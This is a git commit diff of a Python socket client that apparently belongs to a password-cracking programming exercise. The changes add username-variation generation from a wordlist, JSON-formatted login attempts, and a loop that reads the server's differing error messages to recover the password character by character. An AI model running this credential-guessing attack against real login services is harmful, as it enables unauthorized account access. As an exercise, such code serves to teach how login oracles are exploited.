0ea31ddce2a5ff64717ca20b0c10121fa5d1f941
Jonathan <jonathan.gaul1@gmail.com>
2024-04-04 17:58:31 -0400

    Added a function to generate username variations from login.txt and a function to build passwords. The send message function now sends a message in json format.

--- main.py
+++ main.py
@@ -2,6 +2,7 @@ import socket
 import argparse
 import string
 import itertools
+import json
 
 
 BUFFER_SIZE = 1024
@@ -15,27 +16,30 @@ def connect_to_server(client_socket, address):
     client_socket.connect(address)
 
 
-def send_message(client_socket, message):
-    client_socket.send(message.encode())
-    return client_socket.recv(BUFFER_SIZE).decode('utf-8')
+def send_message(client_socket, login, password):
+    message = {"login": login, "password": password}
+    json_message = json.dumps(message)
+    client_socket.sendall(json_message.encode())
+    response_bytes = client_socket.recv(BUFFER_SIZE)
+    response_str = response_bytes.decode('utf-8')
+    return json.loads(response_str)
 
 
 def generate_password():
-    valid_chars = string.ascii_lowercase + string.digits
-    for r in range(1, len(valid_chars) + 1):
-        for password in itertools.product(valid_chars, repeat=r):
-            yield ''.join(password)
+    valid_chars = string.ascii_letters + string.digits + string.punctuation
+    for password in itertools.product(valid_chars):
+        yield ''.join(password)
 
 
-def improved_generate_password():
-    password_dictionary = read_passwords_from_file()
-    for password in password_dictionary:
-        for combination in itertools.product(*zip(password.upper(), password.lower())):
+def generate_login():
+    login_dictionary = read_logins_from_file()
+    for login in login_dictionary:
+        for combination in itertools.product(*zip(login.upper(), login.lower())):
             yield "".join(combination)
 
 
-def read_passwords_from_file():
-    with open('passwords.txt', 'r') as file:
+def read_logins_from_file():
+    with open('logins.txt', 'r') as file:
         return [line.strip() for line in file]
 
 
@@ -43,15 +47,25 @@ def main(ip_address, port):
     address = (ip_address, port)
     with create_socket() as client_socket:
         connect_to_server(client_socket, address)
-        password_generator = improved_generate_password()
+        login_generator = generate_login()
+        login = next(login_generator)
+        password_generator = generate_password()
         password = next(password_generator)
-        response = send_message(client_socket, password)
+        response = send_message(client_socket, login, password)
 
-        while response != "Connection success!":
-            password = next(password_generator)
-            response = send_message(client_socket, password)
+        while response["result"] != "Connection success!":
 
-        print(password)
+            if response["result"] == "Wrong login!":
+                login = next(login_generator)
+            elif response["result"] == "Wrong password!":
+                password = password[:-1] + next(password_generator)
+            elif response["result"] == "Exception happened during login":
+                password_generator = generate_password()
+                password = password + next(password_generator)
+
+            response = send_message(client_socket, login, password)
+        success_output = {"login": login, "password": password}
+        print(json.dumps(success_output))
 
 
 if __name__ == "__main__":
@@ -60,3 +74,4 @@ if __name__ == "__main__":
     parser.add_argument("port", type=int)
     args = parser.parse_args()
     main(args.ip_address, args.port)
+
